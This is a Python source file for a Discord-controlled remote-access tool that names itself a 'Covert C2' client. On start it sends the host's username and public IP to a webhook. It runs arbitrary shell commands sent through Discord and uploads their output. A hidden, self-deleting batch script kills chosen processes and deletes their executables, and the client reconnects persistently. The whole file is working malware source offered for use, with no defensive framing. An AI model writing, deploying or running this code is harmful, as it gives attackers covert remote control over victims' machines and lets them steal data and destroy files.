import discord
import os
import subprocess
import tempfile
import requests
import getpass
import sys
import asyncio
import random
import time

# --- Configuration ---
# IMPORTANT: Replace these with your actual Bot Token, Server (Guild) ID, and Webhook URL
TOKEN = 'DISCORD_TOKEN'
GUILD_ID = 0  # Replace 0 with your integer Server ID
WEBHOOK_URL = ''  # Optional: For startup notifications
# -------------------

MAX_FILE_SIZE = 25 * 1024 * 1024
intents = discord.Intents.default()
intents.message_content = True

class C2Client(discord.Client):
    def __init__(self, *, intents: discord.Intents):
        super().__init__(intents=intents)
        self.tree = discord.app_commands.CommandTree(self)

    async def send_startup_notification(self):
        """Sends a connection message to the configured webhook URL."""
        if not WEBHOOK_URL.startswith("https://discord.com/api/webhooks/"):
            return
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except Exception:
            public_ip = "Unknown"
        username = getpass.getuser()
        embed = {
            "title": "New C2 Connection Established", "color": 0x00ff00,
            "fields": [
                {"name": "Username", "value": f"`{username}`", "inline": True},
                {"name": "Public IP", "value": f"`{public_ip}`", "inline": True}
            ],
            "footer": {"text": "The C2 client is now online and awaiting commands."}
        }
        try:
            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        except Exception:
            pass

    async def on_ready(self):
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        await self.tree.sync(guild=guild)
        await self.send_startup_notification()

client = C2Client(intents=intents)

# --- Command Definitions ---
@client.tree.command(name="help", description="Shows help for all available commands.")
async def help(interaction: discord.Interaction):
    embed = discord.Embed(title="Covert C2 Help", description="Available commands:", color=discord.Color.dark_red())
    embed.add_field(name="`/shell <command>`", value="Executes a shell command.", inline=False)
    embed.add_field(name="`/exit`", value="Gracefully terminates the C2 client.", inline=False)
    embed.add_field(name="`/kill <process_name>`", value="[Windows Only] Kills a process, deletes its executable, and self-destructs.", inline=False)
    embed.set_footer(text="Responses are ephemeral (visible only to you).")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@client.tree.command(name="exit", description="Gracefully terminates the C2 client.")
async def exit_client(interaction: discord.Interaction):
    await interaction.response.send_message("C2 client is shutting down.", ephemeral=True)
    await client.close()

@client.tree.command(name="kill", description="[Windows Only] Kills process, deletes exe, and self-destructs.")
async def kill(interaction: discord.Interaction, process_name: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    if os.name != 'nt':
        await interaction.followup.send("This command is only available on Windows.", ephemeral=True)
        return
    try:
        import psutil
        pids, exe_paths = [], set()
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                pids.append(proc.info['pid'])
                if proc.info['exe']:
                    exe_paths.add(proc.info['exe'])
        if not pids:
            await interaction.followup.send(f"No process named `{process_name}` found.", ephemeral=True)
            return

        bat_content = f"@echo off\n"
        bat_content += f"timeout /t 2 /nobreak > NUL\n" # Short delay
        for pid in pids:
            bat_content += f"taskkill /F /PID {pid}\n"
        for path in exe_paths:
            bat_content += f"del /F /Q \"{path}\"\n"
        bat_content += f"(goto) 2>nul & del \"%~f0\"\n" # Self-delete

        with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as bat_file:
            bat_file.write(bat_content)
            bat_path = bat_file.name
        
        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        await interaction.followup.send(f"Kill sequence initiated for `{process_name}`. It will be terminated and its executable deleted.", ephemeral=True)
    except ImportError:
        await interaction.followup.send("Error: `psutil` library is not installed on the target.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"An error occurred during kill sequence: {str(e)}", ephemeral=True)

@client.tree.command(name="shell", description="Execute a shell command.")
async def shell(interaction: discord.Interaction, command: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    tmp_file_path = None
    try:
        if command.strip().lower().startswith('cd '):
            directory = command.strip().split(' ', 1)[1]
            os.chdir(directory)
            await interaction.followup.send(f"Changed directory to: `{os.getcwd()}`", ephemeral=True)
            return

        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8', errors='replace') as tmp_file:
            tmp_file_path = tmp_file.name
            process = subprocess.Popen(command, shell=True, stdout=tmp_file, stderr=subprocess.STDOUT)
            process.wait(timeout=300)

        file_size = os.path.getsize(tmp_file_path)
        if file_size == 0:
            await interaction.followup.send("Command executed with no output.", ephemeral=True)
        elif file_size > MAX_FILE_SIZE:
            await interaction.followup.send(f"Output too large ({file_size/(1024*1024):.2f}MB). Limit is 25MB.", ephemeral=True)
        else:
            await interaction.followup.send(f"Output for: `{command}`", file=discord.File(tmp_file_path, filename="output.txt"), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {str(e)}", ephemeral=True)
    finally:
        if tmp_file_path and os.path.exists(tmp_file_path):
            os.remove(tmp_file_path)

# --- Main Execution Block with Reconnect Logic ---
if __name__ == '__main__':
    if TOKEN == 'YOUR_DISCORD_BOT_TOKEN' or GUILD_ID == 0:
        sys.exit() # Exit silently if not configured
    
    while True:
        try:
            client.run(TOKEN)
            # If client.run exits cleanly (due to /exit), break the loop
            break
        except Exception:
            # If any error occurs (e.g., network loss), wait and retry
            time.sleep(random.randint(5, 20))

